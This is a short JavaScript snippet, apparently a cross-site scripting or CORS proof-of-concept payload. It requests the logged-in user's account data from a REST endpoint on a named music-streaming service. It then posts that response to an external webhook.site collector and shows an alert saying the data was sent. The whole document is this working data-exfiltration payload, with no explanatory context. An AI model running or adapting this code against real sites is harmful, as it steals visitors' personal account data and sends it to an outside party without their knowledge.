fetch('https://amp.pandora.com/rest/user')
  .then(r => r.text())
  .then(d => {
    fetch('https://webhook.site/a90fcf0f-218a-46ef-a113-6bc249382768', {method:'POST', body:d})
      .then(() => alert('Data sent: ' + d));
    return d;
  })